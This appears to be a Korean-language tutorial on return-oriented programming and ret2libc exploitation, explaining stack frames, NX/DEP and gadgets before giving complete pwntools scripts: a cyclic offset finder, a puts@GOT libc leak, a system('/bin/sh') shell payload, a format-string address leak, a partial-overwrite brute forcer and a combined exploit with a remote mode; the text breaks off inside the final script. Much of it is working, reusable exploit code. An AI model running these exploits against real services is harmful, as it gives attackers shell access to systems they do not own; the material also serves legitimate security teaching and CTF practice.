> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# ROP(Return-Oriented Programming) 체인 구성

## 0. 초보자를 위한 개념 이해

### ROP(Return-Oriented Programming)란?

**ROP(리턴 지향 프로그래밍)**은 NX/DEP(스택 실행 방지) 보호를 우회하기 위한 공격 기법입니다. 새 코드를 삽입하는 대신 이미 실행 파일에 존재하는 코드 조각(가젯)을 재조합해 원하는 동작을 만들어냅니다.

**왜 배우는가:**
```
NX/DEP 보호 이후의 시대:

이전 (NX 없음):
  버퍼 오버플로 → 셸코드 직접 주입 → 실행

NX 도입 후:
  셸코드 주입해도 스택/힙은 실행 불가!
  → 공격자 해결책: "기존 코드 재활용"

ROP 원리:
  프로그램 내부 코드 조각 (Gadget):
    "pop rdi; ret"  → rdi 레지스터에 값 설정
    "pop rsi; ret"  → rsi 레지스터에 값 설정
    "syscall"       → 시스템 콜 실행
  → 조각들을 연결해 /bin/sh 실행
```

### 핵심 개념 정리

```
ROP 가젯 (Gadget):
  ret 명령어로 끝나는 짧은 어셈블리 시퀀스
  예: 0x401234: pop rdi; ret
      0x401238: pop rsi; ret
      0x40123c: syscall

ROP 체인 구성:
  스택에 가젯 주소들을 순서대로 배치
  각 ret이 다음 가젯으로 점프

ret2libc 기법:
  system("/bin/sh") 함수 주소를 직접 호출
  libc 라이브러리에 system()이 이미 있음
  → "/bin/sh" 문자열 주소 + system() 주소 = 쉘!
```

### 필요한 도구
- **pwntools**: Python 익스플로잇 개발 라이브러리
- **ROPgadget**: 바이너리에서 가젯 자동 탐색
- **ropper**: 가젯 탐색 + 체인 구성 도우미
- **GDB + pwndbg**: 익스플로잇 디버깅

### 기초 실습 예제
```python
# pwntools로 ROP 체인 구성
from pwn import *

# 바이너리 로드
elf = ELF("./vulnerable_binary")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# ROP 객체 생성
rop = ROP(elf)

# ret2libc 체인: system("/bin/sh") 호출
binsh = next(libc.search(b"/bin/sh"))  # /bin/sh 문자열 주소
rop.call(libc.sym['system'], [binsh])   # system("/bin/sh")

print(f"ROP 체인: {rop.chain().hex()}")
print(f"/bin/sh 주소: {hex(binsh)}")
```

---

## 학습 목표

이 문서를 완료하면 다음을 이해하고 실습할 수 있습니다:

- 스택 메모리와 함수 호출 흐름을 그림으로 설명할 수 있다
- NX/DEP 보호 기법이 왜 기존 셸코드 인젝션을 막는지 이해한다
- ROP(Return-Oriented Programming)의 핵심 아이디어를 비유로 설명할 수 있다
- ROPgadget, ropper, pwntools로 가젯을 직접 찾을 수 있다
- ret2libc 공격 흐름(leak → 계산 → 셸 획득)을 단계별로 수행할 수 있다
- ASLR 환경에서 포맷 스트링 leak을 이용한 주소 우회를 이해한다
- pwntools로 완성된 ROP 익스플로잇 스크립트를 작성할 수 있다

---

## 사전 지식: 스택 메모리 기초

### 스택이란 무엇인가?

스택(Stack)은 컴퓨터 메모리의 한 영역으로, **쌓이는 접시**에 비유할 수 있습니다.

식당에서 빈 접시를 쌓을 때:
- 새 접시는 항상 **맨 위에** 올린다 (push)
- 접시를 꺼낼 때도 항상 **맨 위에서** 꺼낸다 (pop)
- 맨 아래에 있는 접시를 꺼내려면 위의 접시를 먼저 다 꺼내야 한다

이것이 **LIFO (Last In, First Out)** — 마지막에 넣은 것이 가장 먼저 나온다.

```
접시 비유                     컴퓨터 스택 (메모리)
                              낮은 주소 (Low Address)
[ 접시 3 ]  ← 가장 나중에 올림  ┌─────────────────┐ ← rsp (스택 포인터)
[ 접시 2 ]                    │  로컬 변수 etc   │
[ 접시 1 ]  ← 가장 먼저 올림   │  저장된 레지스터 │
                              │  return address │
                              └─────────────────┘
                              높은 주소 (High Address)  ← 스택은 아래 방향으로 자람
```

> 중요: 컴퓨터 스택은 **낮은 주소 방향으로 자랍니다.** 새 데이터를 push할수록 주소가 낮아집니다. 직관에 반하므로 반드시 기억하세요.

---

### 주요 레지스터 역할

x86-64 아키텍처에서 스택 관련 핵심 레지스터 3개:

| 레지스터 | 이름 | 역할 |
|---------|------|------|
| `rsp` | Stack Pointer | 현재 스택의 꼭대기(top) 주소를 가리킴. push/pop 시 자동 변경 |
| `rbp` | Base Pointer | 현재 함수 스택 프레임의 바닥(base) 주소. 로컬 변수 접근 기준점 |
| `rip` | Instruction Pointer | 다음에 실행할 명령어의 주소. CPU가 여기를 보고 무엇을 실행할지 결정 |

```
함수 스택 프레임 구조
낮은 주소
┌──────────────────────────────┐ ← rsp (함수 실행 중)
│  로컬 변수들                  │  (char buf[64] 같은 것들)
│  ...                         │
│  ...                         │
├──────────────────────────────┤ ← rbp (현재 함수의 베이스)
│  이전 함수의 rbp (saved rbp)  │  함수 종료 시 복원됨
├──────────────────────────────┤
│  리턴 주소 (return address)   │  ← 공격 목표! 이 값을 덮으면 실행 흐름 제어
├──────────────────────────────┤
│  함수 인자들 (caller의 공간)   │
│  ...                         │
높은 주소
```

---

### 함수 호출 시 스택 동작

아래 C 코드를 예시로:

```c
void vulnerable(char *input) {
    char buf[64];
    strcpy(buf, input);  // 위험: 길이 체크 없음
}

int main() {
    vulnerable("hello");
    return 0;
}
```

`main`이 `vulnerable`을 호출할 때 스택에서 일어나는 일:

```
1단계: main이 call vulnerable 실행 전
   rsp → [ main의 스택 프레임 ]
          [ ... ]

2단계: call 명령 실행 — 리턴 주소를 스택에 push
   rsp → [ return address ]   ← main+다음줄 주소 자동 저장
          [ main의 스택 프레임 ]

3단계: vulnerable 함수 진입, 프롤로그 실행
   push rbp           ; 이전 rbp 저장
   mov rbp, rsp       ; 새 베이스 설정
   sub rsp, 0x50      ; 로컬 변수 공간 확보 (buf[64] + 여유)

   rsp → [ buf[64]           ]  ← 사용자 입력이 여기에 저장
          [ saved rbp         ]
          [ return address    ]  ← main으로 돌아갈 주소

4단계: ret 명령 실행 (함수 종료)
   pop rip            ; 스택에서 리턴 주소 꺼내 rip에 저장
   → rip가 가리키는 곳으로 점프 (main으로 복귀)
```

---

## 버퍼 오버플로우 복습 — 리턴 주소 덮기

위의 `vulnerable` 함수에서 `buf`는 64바이트입니다. 그런데 `strcpy`는 입력 길이를 확인하지 않습니다.

64바이트를 초과해서 입력을 넣으면:

```
정상 입력 (64바이트 이하):
rsp → [ "AAAA...A" (64바이트)  ]  ← buf
       [ saved rbp (8바이트)    ]
       [ return address (8바이트) ]  정상 유지

오버플로우 입력 (72바이트 이상):
rsp → [ "AAAA...A" (64바이트)  ]  ← buf
       [ "AAAAAAAA" (8바이트)   ]  ← saved rbp 덮임
       [ "BBBBBBBB"             ]  ← return address 덮임! ← rip 조작 가능
```

리턴 주소를 우리가 원하는 값으로 덮으면, `ret` 명령 실행 시 CPU가 그 주소로 점프합니다.

**오프셋 계산**: `buf` 시작에서 리턴 주소까지의 거리
- buf[64] + saved rbp[8] = **72바이트** 뒤에 리턴 주소

---

## NX/DEP 보호 기법 — "코드 실행 금지 구역"

### NX/DEP가 없던 시절

예전에는 버퍼 오버플로우 공격이 매우 단순했습니다:

```
1. 버퍼에 셸코드(기계어 코드) 삽입
2. 리턴 주소를 버퍼 주소로 덮기
3. 함수 종료 시 rip가 버퍼를 가리킴
4. 버퍼에 있는 셸코드 실행 → /bin/sh 획득
```

### NX/DEP란?

**NX (No-eXecute)** 또는 **DEP (Data Execution Prevention)**:

> 메모리를 쓰기 가능(W)하거나 실행 가능(X)하게 설정하되, **동시에 둘 다 허용하지 않는다** (W⊕X 원칙)

쉽게 말하면: "데이터 영역에서는 코드를 실행할 수 없다"

```
메모리 영역별 권한 (NX 활성화 시):
┌─────────────────────────────────────────────┐
│  텍스트 세그먼트 (.text)     r-x  실행 가능  │ ← 프로그램 코드
│  데이터 세그먼트 (.data)     rw-  실행 불가  │ ← 전역 변수
│  스택                        rw-  실행 불가  │ ← 로컬 변수, 버퍼
│  힙                          rw-  실행 불가  │ ← 동적 할당
└─────────────────────────────────────────────┘

공격자가 스택에 셸코드를 주입해도 실행하려 하면
→ CPU가 "이 영역은 실행 불가" 확인 → Segfault 발생 → 공격 실패
```

### 확인 방법

```bash
# checksec으로 보호 기법 확인
checksec --file=./vuln_binary

# 예시 출력:
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled          ← NX 활성화
# PIE:      No PIE
```

---

## ROP (Return-Oriented Programming) 개념

### 핵심 아이디어 — 레고 조립 비유

NX/DEP가 "데이터 영역에서 코드 실행 불가"라면, **이미 실행 가능한 영역의 코드**를 사용하면 어떨까요?

> "새 코드를 삽입하는 게 아니라, 프로그램 안에 이미 있는 코드 조각들을 이어 붙여 새로운 기능을 만든다"

이것이 **ROP**입니다. 마치 레고처럼:
- 레고 블록 = 가젯(gadget): 프로그램 메모리에 이미 존재하는 짧은 코드 조각
- 레고 조립 = ROP 체인: 가젯들을 스택에 순서대로 배열
- 완성된 작품 = 공격자가 원하는 기능 (예: system("/bin/sh"))

### 가젯(Gadget)이란?

`ret` 명령으로 끝나는 짧은 명령어 시퀀스:

```asm
; 가젯 예시 1: pop rdi; ret
; 역할: 스택에서 값을 꺼내 rdi에 저장 후 다음 가젯으로 이동
58          pop rdi
c3          ret

; 가젯 예시 2: pop rsi; pop r15; ret
; 역할: 두 값을 꺼내 rsi, r15에 저장
5e          pop rsi
41 5f       pop r15
c3          ret

; 가젯 예시 3: mov rax, rdi; ret
; 역할: rdi 값을 rax에 복사
48 89 f8    mov rax, rdi
c3          ret

; 가젯 예시 4: syscall; ret
; 역할: 시스템 콜 실행 (rax에 번호, 인자는 rdi/rsi/rdx...)
0f 05       syscall
c3          ret
```

`ret` 명령의 역할: 스택 꼭대기의 값을 꺼내서 `rip`에 저장 → 그 주소로 점프

즉, **`ret`이 있으면 다음 가젯으로 계속 이동**할 수 있습니다.

### ROP 체인이 NX/DEP를 우회하는 이유

```
NX/DEP의 보호 원리: "데이터(스택) 영역 코드 실행 불가"

ROP의 트릭:
- 스택에는 코드가 없다 → 주소(숫자)만 있다
- 실제 코드는 .text 섹션 또는 libc.so (실행 가능 영역)에 있다
- 스택의 주소들은 그 코드를 "가리킬" 뿐이다

따라서 CPU 입장에서:
→ 코드를 실행하는 위치 = .text 또는 libc (실행 가능 영역) ✓
→ NX/DEP 위반 없음!
```

---

### ROP 체인 동작 원리 (시각적 설명)

```
버퍼 오버플로우 이후 스택 레이아웃:

낮은 주소
┌──────────────────────────┐ ← rsp (현재 스택 포인터)
│  "AAAA...AAAA" (padding) │  ← buf[64] 채우기
├──────────────────────────┤
│  "BBBBBBBB"              │  ← saved rbp 덮기
├──────────────────────────┤
│  gadget1_addr            │  ← 덮어쓴 리턴 주소 → 여기서 ROP 시작
├──────────────────────────┤
│  arg_for_gadget1         │  ← gadget1의 pop이 읽을 값
├──────────────────────────┤
│  gadget2_addr            │  ← gadget1의 ret → gadget2로 이동
├──────────────────────────┤
│  arg_for_gadget2         │  ← gadget2가 읽을 값
├──────────────────────────┤
│  ...                     │
├──────────────────────────┤
│  system() 주소           │  ← 최종 목표: system() 호출
├──────────────────────────┤
│  "/bin/sh" 주소          │  ← system의 인자 (rdi에 들어감)
└──────────────────────────┘
높은 주소

실행 흐름:
1. vulnerable() 함수 ret → gadget1_addr로 점프
2. gadget1 실행: pop rdi (스택에서 arg_for_gadget1 꺼내 rdi에 저장)
3. gadget1의 ret → gadget2_addr로 점프
4. gadget2 실행: ...
5. 최종: system() 실행, rdi = "/bin/sh" → 셸 획득!
```

---

## x86-64 함수 호출 규약 (Calling Convention)

ROP로 함수를 호출하려면, 인자를 올바른 레지스터에 넣어야 합니다.

**x86-64 System V AMD64 ABI (Linux)**:

| 인자 순서 | 레지스터 |
|----------|---------|
| 1번째 인자 | `rdi` |
| 2번째 인자 | `rsi` |
| 3번째 인자 | `rdx` |
| 4번째 인자 | `rcx` |
| 5번째 인자 | `r8` |
| 6번째 인자 | `r9` |
| 리턴값 | `rax` |

예: `system("/bin/sh")` 호출 시
- `rdi` = "/bin/sh" 문자열의 주소
- `rsp`는 16바이트 정렬 필요 (MOVAPS 명령 때문)

---

## 가젯 찾기

### ROPgadget 사용법

```bash
# 설치
pip install ropgadget

# 바이너리에서 모든 가젯 나열
ROPgadget --binary ./vuln_binary --rop

# 특정 가젯 검색
ROPgadget --binary ./vuln_binary --rop | grep "pop rdi"
ROPgadget --binary ./vuln_binary --rop | grep "pop rsi"
ROPgadget --binary ./vuln_binary --rop | grep ": ret$"

# libc에서 가젯 검색
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --rop | grep "pop rdi ; ret"

# "/bin/sh" 문자열 주소 찾기
ROPgadget --binary ./vuln_binary --string "/bin/sh"
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "/bin/sh"

# 자동 체인 생성 시도
ROPgadget --binary ./vuln_binary --rop --chain "execve"
```

### ropper 사용법

```bash
# 설치
pip install ropper

# 가젯 검색
ropper --file ./vuln_binary --search "pop rdi"

# 배드 바이트 제외 (null, 개행 등 포함된 가젯 제거)
ropper --file ./vuln_binary --search "pop rdi" --badbytes "00 0a 0d"

# 여러 파일 동시 검색
ropper --file ./vuln_binary --file /lib/x86_64-linux-gnu/libc.so.6

# 자동 체인 생성
ropper --file ./vuln_binary --chain execve
```

### pwntools에서 가젯 찾기

```python
#!/usr/bin/env python3
"""pwntools ROP 모듈로 가젯 찾기 예시."""

from pwn import ELF, ROP


def find_gadgets(binary_path: str) -> None:
    elf = ELF(binary_path)
    rop = ROP(elf)

    # 자주 쓰는 가젯 검색
    # find_gadget은 명령어 리스트를 받아 연속으로 매칭
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])
    pop_rsi_r15 = rop.find_gadget(["pop rsi", "pop r15", "ret"])
    pop_rdx = rop.find_gadget(["pop rdx", "ret"])
    ret_only = rop.find_gadget(["ret"])

    if pop_rdi:
        print(f"pop rdi; ret        = {hex(pop_rdi[0])}")
    if pop_rsi_r15:
        print(f"pop rsi; pop r15; ret = {hex(pop_rsi_r15[0])}")
    if pop_rdx:
        print(f"pop rdx; ret        = {hex(pop_rdx[0])}")
    if ret_only:
        print(f"ret                 = {hex(ret_only[0])}")

    # dump()로 찾은 가젯 전체 출력
    print("\n=== 모든 ROP 가젯 ===")
    print(rop.dump())


if __name__ == "__main__":
    find_gadgets("./vuln_binary")
```

---

## ret2libc 공격 — 단계별 실습

### ret2libc란?

**libc (GNU C Library)**: C 표준 라이브러리. 거의 모든 Linux 프로그램이 사용합니다.

libc 안에는:
- `system()` 함수 (셸 명령 실행)
- `/bin/sh` 문자열 (셸 실행 인자)

libc는 실행 가능 영역에 매핑되어 있으므로, **ROP로 libc 함수를 호출**할 수 있습니다.

```
ret2libc 공격 목표:
  system("/bin/sh") 실행

필요한 것:
  1. system() 함수의 실제 메모리 주소
  2. "/bin/sh" 문자열의 실제 메모리 주소
  3. pop rdi; ret 가젯 주소 (rdi에 "/bin/sh" 넣기 위해)
```

### ASLR 문제

ASLR (Address Space Layout Randomization): 프로그램 실행마다 libc 로드 주소가 바뀝니다.

```bash
# ASLR 상태 확인
cat /proc/sys/kernel/randomize_va_space
# 0 = 비활성, 1 = 부분 랜덤, 2 = 완전 랜덤

# 테스트용 임시 비활성화 (root 필요)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

ASLR이 있어도 **libc 내부의 오프셋은 고정**입니다. 베이스 주소만 알면:

```
system()의 실제 주소 = libc_base + system_offset
"/bin/sh"의 실제 주소 = libc_base + binsh_offset
```

---

### 1단계: 버퍼 오버플로우 오프셋 찾기

```python
#!/usr/bin/env python3
"""
cyclic 패턴으로 BOF 오프셋 자동 계산.

사용법:
  python3 find_offset.py --binary ./vuln
"""

import argparse
import subprocess
from pathlib import Path

from pwn import ELF, context, cyclic, cyclic_find, process, Coredump


def find_offset(binary_path: str) -> int:
    """cyclic 패턴을 전송하고 core dump에서 오프셋 추출."""
    context.binary = elf = ELF(binary_path)
    context.log_level = "warning"  # 불필요한 출력 줄이기

    # 코어 덤프 활성화
    subprocess.run(["ulimit", "-c", "unlimited"], shell=True)

    p = process(binary_path)

    # 200바이트 cyclic 패턴 생성 및 전송
    # cyclic은 각 4(또는 8)바이트 시퀀스가 유일한 패턴 생성
    pattern = cyclic(200, n=8)  # n=8: 64비트용
    p.sendline(pattern)
    p.wait()

    # core dump에서 충돌 시점의 rsp 값 읽기
    try:
        core = Coredump("./core")
        # rsp가 가리키는 값 → cyclic 패턴 어느 위치인지 계산
        offset = cyclic_find(core.read(core.rsp, 8), n=8)
        print(f"[+] 오프셋 발견: {offset} 바이트")
        return offset
    except FileNotFoundError:
        print("[-] core dump 없음. /proc/sys/kernel/core_pattern 확인")
        return -1


def main() -> None:
    parser = argparse.ArgumentParser(description="BOF 오프셋 자동 계산")
    parser.add_argument("--binary", required=True, help="바이너리 경로")
    args = parser.parse_args()

    offset = find_offset(args.binary)
    if offset >= 0:
        print(f"[*] 사용할 오프셋: {offset}")
    else:
        print("[!] 오프셋 계산 실패. GDB로 수동 확인 필요")


if __name__ == "__main__":
    main()
```

### 2단계: libc 베이스 주소 Leak (GOT/PLT 이용)

ASLR이 있어도 **PLT/GOT 트릭**으로 libc 주소를 알아낼 수 있습니다.

```
GOT (Global Offset Table): 동적 링크 함수의 실제 주소를 저장하는 테이블
PLT (Procedure Linkage Table): 동적 링크 함수를 처음 호출할 때 GOT를 업데이트하는 stub

핵심:
- puts@GOT에는 puts()의 실제 libc 주소가 저장되어 있다
- puts()를 이용해 puts@GOT의 내용을 출력하면 → puts의 실제 주소 leak
- puts_실제주소 - puts_libc_오프셋 = libc_베이스
```

```python
#!/usr/bin/env python3
"""
1단계: puts(puts@GOT)로 libc 주소 leak.

GOT leak 페이로드:
  [padding] → [pop rdi; ret] → [puts@GOT 주소] → [puts@PLT] → [main 주소]
"""

import argparse
from pwn import ELF, ROP, context, flat, p64, process, remote, u64


def leak_puts_address(
    p,  # process | remote
    elf: ELF,
    rop: ROP,
    offset: int,
) -> int:
    """puts(puts@GOT) 호출로 puts의 실제 libc 주소 leak."""
    # 필요한 가젯과 주소 수집
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

    # 페이로드 조립:
    # 1. padding: buf를 채우고 saved rbp를 덮음
    # 2. pop rdi; ret: 다음 스택값(puts@GOT)을 rdi에 저장
    # 3. puts@GOT 주소: rdi에 들어갈 값 (puts의 실제 주소가 저장된 위치)
    # 4. puts@PLT: puts() 호출 → GOT 내용(=puts 실제 주소) 출력
    # 5. main 주소: puts 출력 후 다시 main으로 돌아가 2번째 페이로드 전송
    payload = flat(
        b"A" * offset,                # padding
        pop_rdi,                      # 가젯: pop rdi; ret
        elf.got["puts"],              # puts@GOT 주소 → rdi
        elf.plt["puts"],              # puts() 호출
        elf.symbols["main"],          # main으로 복귀
    )

    p.sendlineafter(b"Input: ", payload)

    # puts()는 주소를 바이너리로 출력 (리틀엔디언 6바이트, null은 출력 안 함)
    leaked_bytes = p.recvline().strip()
    # 6바이트를 받아 8바이트로 패딩 후 u64로 언패킹
    leaked_addr = u64(leaked_bytes.ljust(8, b"\x00"))

    print(f"[+] puts 실제 주소 leak: {hex(leaked_addr)}")
    return leaked_addr


def main() -> None:
    parser = argparse.ArgumentParser(description="libc 베이스 주소 leak")
    parser.add_argument("--binary", default="./vuln")
    parser.add_argument("--libc", default="/lib/x86_64-linux-gnu/libc.so.6")
    parser.add_argument("--offset", type=int, required=True)
    args = parser.parse_args()

    context.binary = elf = ELF(args.binary)
    libc = ELF(args.libc)
    rop = ROP(elf)

    p = process(args.binary)
    leaked_puts = leak_puts_address(p, elf, rop, args.offset)

    # libc 베이스 = puts 실제 주소 - puts의 libc 내 오프셋
    libc.address = leaked_puts - libc.symbols["puts"]
    print(f"[+] libc 베이스 주소: {hex(libc.address)}")
    print(f"[+] system() 주소: {hex(libc.symbols['system'])}")
    p.close()


if __name__ == "__main__":
    main()
```

### 3단계: system("/bin/sh") 호출로 셸 획득

```python
#!/usr/bin/env python3
"""
2단계 페이로드: libc 베이스를 이용해 system("/bin/sh") 호출.

페이로드 구조:
  [padding] → [ret (정렬)] → [pop rdi; ret] → [/bin/sh 주소] → [system()]
"""

import argparse
from pwn import ELF, ROP, context, flat, process


def get_shell(
    p,  # process | remote
    libc: ELF,
    rop: ROP,
    offset: int,
) -> None:
    """libc 주소 기반으로 system("/bin/sh") 호출."""
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    # ret 가젯: 스택 16바이트 정렬을 위한 패딩
    # system() 내부의 MOVAPS 명령은 16바이트 정렬을 요구
    # ret 가젯을 하나 더 추가하면 rsp가 8바이트 이동 → 정렬 맞춤
    ret_gadget = rop.find_gadget(["ret"])[0]

    # libc에서 "/bin/sh" 문자열 주소 찾기
    # search()는 제너레이터 반환, next()로 첫 번째 주소 획득
    binsh_addr = next(libc.search(b"/bin/sh\x00"))
    system_addr = libc.symbols["system"]

    print(f"[*] /bin/sh 주소: {hex(binsh_addr)}")
    print(f"[*] system() 주소: {hex(system_addr)}")

    payload = flat(
        b"A" * offset,       # padding
        ret_gadget,          # 스택 16바이트 정렬 맞추기
        pop_rdi,             # pop rdi; ret
        binsh_addr,          # rdi = "/bin/sh" 주소
        system_addr,         # call system()
    )

    p.sendlineafter(b"Input: ", payload)
    p.interactive()  # 셸 상호작용 모드


def main() -> None:
    parser = argparse.ArgumentParser(description="ret2libc system 셸 획득")
    parser.add_argument("--binary", default="./vuln")
    parser.add_argument("--libc", default="/lib/x86_64-linux-gnu/libc.so.6")
    parser.add_argument("--offset", type=int, required=True)
    parser.add_argument("--libc-base", type=lambda x: int(x, 16), required=True,
                        help="leak된 libc 베이스 주소 (16진수)")
    args = parser.parse_args()

    context.binary = elf = ELF(args.binary)
    libc = ELF(args.libc)
    libc.address = args.libc_base
    rop = ROP(elf)

    p = process(args.binary)
    get_shell(p, libc, rop, args.offset)


if __name__ == "__main__":
    main()
```

---

## ASLR 우회 방법

### 방법 1: Format String Leak (포맷 스트링 취약점)

```python
#!/usr/bin/env python3
"""
포맷 스트링 취약점을 이용한 스택/libc 주소 leak.

취약한 코드 예시:
  printf(user_input);  // printf("%s", user_input) 이어야 함

사용법:
  python3 fmt_leak.py --binary ./fmt_vuln --offset 72
"""

import argparse
from pwn import ELF, context, process


def leak_addresses_via_fmt(
    p,           # process | remote
    num_entries: int = 30,
) -> list[int]:
    """%p 포맷 스트링으로 스택의 주소들을 leak."""
    # %p는 포인터 크기의 값을 16진수로 출력
    # %1$p는 첫 번째 인자, %2$p는 두 번째 인자...
    # printf는 인자를 스택에서 읽으므로 스택 내용을 순서대로 출력
    fmt_str = b" ".join(f"%{i}$p".encode() for i in range(1, num_entries + 1))

    p.sendlineafter(b"Input: ", fmt_str)
    output = p.recvline().decode(errors="replace").strip()

    addresses = []
    for token in output.split():
        try:
            addr = int(token, 16)
            addresses.append(addr)
        except ValueError:
            addresses.append(0)

    return addresses


def identify_libc_address(
    addresses: list[int],
    libc: ELF,
    known_symbol: str = "puts",
) -> int | None:
    """leak된 주소 중 libc 범위 내의 주소를 찾아 베이스 계산."""
    libc_size = 0x200000  # libc는 보통 1~2MB 크기

    for i, addr in enumerate(addresses):
        if addr == 0:
            continue
        # libc 주소는 보통 0x7f로 시작 (64비트 Linux)
        if (addr >> 40) == 0x7f:
            offset = addr & 0xFFF  # 하위 12비트 (페이지 내 오프셋)
            print(f"[*] 스택 위치 {i+1}: {hex(addr)} (libc 후보)")

    return None


def main() -> None:
    parser = argparse.ArgumentParser(description="포맷 스트링 주소 leak")
    parser.add_argument("--binary", required=True)
    parser.add_argument("--entries", type=int, default=30, help="출력할 스택 엔트리 수")
    args = parser.parse_args()

    context.binary = elf = ELF(args.binary)

    p = process(args.binary)
    addresses = leak_addresses_via_fmt(p, args.entries)

    print("\n=== 스택 주소 목록 ===")
    for i, addr in enumerate(addresses):
        flag = " ← libc 후보" if (addr >> 40) == 0x7f else ""
        flag = flag or (" ← 스택 후보" if (addr >> 40) == 0x7f else "")
        if addr:
            print(f"  [{i+1:2d}] {hex(addr)}{flag}")

    p.close()


if __name__ == "__main__":
    main()
```

### 방법 2: Partial Overwrite (부분 주소 덮기)

```python
#!/usr/bin/env python3
"""
ASLR 부분 우회: 주소 하위 12비트는 항상 고정.
하위 1~2바이트만 덮어서 원하는 함수 오프셋으로 점프.
성공 확률: 1/16 (nibble 브루트포스)
"""

import argparse
import time
from pwn import ELF, context, process, p16


def partial_overwrite_bruteforce(
    binary_path: str,
    offset: int,
    target_low_bytes: int,  # 덮을 하위 2바이트 값 (예: 0x17d0)
    max_attempts: int = 64,
) -> bool:
    """
    하위 2바이트만 덮어 랜덤 ASLR nibble 브루트포스.
    ASLR로 상위 비트는 매번 바뀌지만 하위 12비트(3 nibble)는 고정.
    """
    context.log_level = "error"  # 조용히 시도

    for attempt in range(max_attempts):
        p = process(binary_path)

        # padding + 하위 2바이트만 덮기
        payload = b"A" * offset + p16(target_low_bytes)

        try:
            p.sendlineafter(b"Input: ", payload)
            # 셸이 열리면 output이 다름
            p.sendline(b"id")
            result = p.recv(timeout=0.5)
            if b"uid=" in result:
                print(f"[+] 성공! (시도 {attempt + 1}번)")
                p.interactive()
                return True
        except Exception:
            pass
        finally:
            p.close()

        time.sleep(0.05)

    print(f"[-] {max_attempts}번 시도 후 실패")
    return False


def main() -> None:
    parser = argparse.ArgumentParser(description="Partial Overwrite ASLR 우회")
    parser.add_argument("--binary", required=True)
    parser.add_argument("--offset", type=int, required=True)
    parser.add_argument("--target", type=lambda x: int(x, 16), required=True,
                        help="덮을 하위 2바이트 (예: 0x17d0)")
    parser.add_argument("--attempts", type=int, default=64)
    args = parser.parse_args()

    partial_overwrite_bruteforce(
        args.binary, args.offset, args.target, args.attempts
    )


if __name__ == "__main__":
    main()
```

---

## 완전한 pwntools ROP 익스플로잇

모든 단계를 합쳐서 하나의 완성된 스크립트:

```python
#!/usr/bin/env python3
"""
ROP Chain Exploit — ret2libc 완전 자동화 스크립트.

공격 흐름:
  1. BOF로 리턴 주소 덮기
  2. puts(puts@GOT)로 libc 베이스 주소 leak
  3. 다시 main으로 돌아가기
  4. system("/bin/sh") 호출로 셸 획득

사용법:
  python3 rop_exploit.py --binary ./vuln --offset 72 --mode local
  python3 rop_exploit.py --binary ./vuln --offset 72 --mode remote --host 10.0.0.1 --port 9001
"""

import argparse
import sys
from pwn import (
    ELF,
    ROP,
    context,
    flat,
    log,
    process,
    remote,
    u64,
)


def get_target(args: argparse.Namespace) -> "process | remote":
    """로컬 프로세스 또는 원격 서버에 연결."""
    if args.mode == "remote":
        log.info(f"원격 접속: {args.host}:{args.port}")
        return remote(args.host, args.port)
    log.info(f"로컬 프로세스: {args.binary}")
    return process(args.binary)


def leak_libc_base(
    p: "process | remote",
    elf: ELF,
    rop: ROP,
    offset: int,
) -> int:
    """
    Stage 1: puts(puts@GOT)를 이용해 libc 베이스 주소 leak.

    스택 레이아웃:
      [A * offset] [pop rdi] [puts@GOT] [puts@PLT] [main]
    """
    # pop rdi; ret 가젯 — rdi에 인자를 넣는 데 사용
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    log.debug(f"pop rdi; ret 가젯: {hex(pop_rdi)}")

    # 페이로드: puts(puts@GOT) 호출 후 main으로 복귀
    payload = flat(
        b"A" * offset,           # 버퍼 채우기 + saved rbp 덮기
        pop_rdi,                 # pop rdi; ret — rdi 설정 가젯
        elf.got["puts"],         # rdi = puts@GOT 주소 (puts 실제 주소가 저장된 곳)
        elf.plt["puts"],         # call puts() — GOT 내용을 stdout으로 출력
        elf.symbols["main"],     # 출력 후 main()으로 돌아가기 (2번째 페이로드 전송용)
    )

    p.sendlineafter(b"Input: ", payload)

    # puts()가 출력한 6바이트 주소 읽기
    # x64에서 주소는 8바이트지만 상위 2바이트는 0x00이라 출력 안 됨
    leaked_raw = p.recvline().strip()
    if not leaked_raw:
        log.error("주소 leak 실패 — 페이로드 또는 바이너리 확인 필요")
        sys.exit(1)

    # 6바이트 → 8바이트로 패딩 후 언팩
    leaked_puts = u64(leaked_raw.ljust(8, b"\x00"))
    log.success(f"puts() 실제 주소: {hex(leaked_puts)}")
    return leaked_puts


def get_shell(
    p: "process | remote",
    libc: ELF,
    rop: ROP,
    offset: int,
) -> None:
    """
    Stage 2: libc 주소를 이용해 system("/bin/sh") 호출.

    스택 레이아웃:
      [A * offset] [ret] [pop rdi] [/bin/sh addr] [system addr]
    """
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    # ret 가젯: system() 진입 전 스택을 16바이트 정렬
    # system() 내부에서 MOVAPS xmm0, [rsp+...] 같은 SSE 명령 사용
    # MOVAPS는 16바이트 정렬된 주소 요구 → 정렬 안 되면 SIGSEGV
    ret_gadget = rop.find_gadget(["ret"])[0]

    binsh_addr = next(libc.search(b"/bin/sh\x00"))
    system_addr = libc.symbols["system"]

    log.info(f"/bin/sh 주소: {hex(binsh_addr)}")
    log.info(f"system() 주소: {hex(system_addr)}")

    payload = flat(
        b"A" * offset,       # padding
        ret_gadget,          # 스택 16바이트 정렬 맞추기
        pop_rdi,             # pop rdi; ret
        binsh_addr,          # rdi = "/bin/sh"
        system_addr,         # call system("/bin/sh")
    )

    p.sendlineafter(b"Input: ", payload)
    log.success("셸 획득! 인터랙티브 모드 진입...")
    p.interactive()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="ROP Chain Exploit — ret2libc 자동화",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  python3 rop_exploit.py --binary ./vuln --offset 72
  python3 rop_exploit.py --binary ./vuln --offset 72 --mode remote --host ctf.example.com --port 9001
""",
    )
